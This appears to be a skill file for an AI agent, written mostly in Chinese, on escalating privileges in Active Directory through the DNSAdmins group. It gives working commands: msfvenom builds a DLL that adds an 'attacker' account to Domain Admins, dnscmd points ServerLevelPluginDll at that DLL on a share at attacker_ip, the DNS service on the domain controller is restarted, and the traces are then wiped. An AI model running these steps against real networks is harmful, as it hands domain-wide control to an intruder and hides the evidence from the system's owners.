---
name: 'dnsadmins-privesc'
description: 'DNSAdmins组→ServerLevelPluginDll DLL注入→SYSTEM on DC。AD DNS提权标准技术。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## AD DNS / DNSAdmins 提权

### 原理
DNSAdmins 组成员可以控制 AD DNS 服务。通过修改注册表 `ServerLevelPluginDll` 指向恶意 DLL，DNS 服务（通常以 SYSTEM 运行在 DC 上）重启时加载 DLL → SYSTEM。

### 检测
```powershell
whoami /groups | findstr DNSAdmins
Get-ADGroupMember -Identity DNSAdmins
```

### 利用
```powershell
# 1. 生成恶意 DLL (msfvenom 或使用 mimikatz.dll)
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" attacker /add /domain' -f dll -o evil.dll

# 2. 将 DLL 放到可访问的共享
# 3. 配置 DNS 加载 DLL
dnscmd <DC> /config /serverlevelplugindll \\attacker_ip\share\evil.dll

# 4. 重启 DNS 服务（或等待）
sc \\<DC> stop dns && sc \\<DC> start dns
# 或者
Restart-Service -Name DNS -ComputerName <DC>

# 4a. 如果直接重启被权限限制
# → 停止 DNS → 任何依赖 DNS 的服务会触发自动重启
```

### 注册表路径
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters`
- `ServerLevelPluginDll` (REG_SZ) → DLL 路径

### 卸载（清理痕迹）
```powershell
dnscmd <DC> /config /serverlevelplugindll ""
sc \\<DC> stop dns && sc \\<DC> start dns
```

### mimikatz 自定义 DLL
```bash
git clone https://github.com/gentilkiwi/mimikatz
# 修改 kdns.c → 添加自定义逻辑 → 编译
```
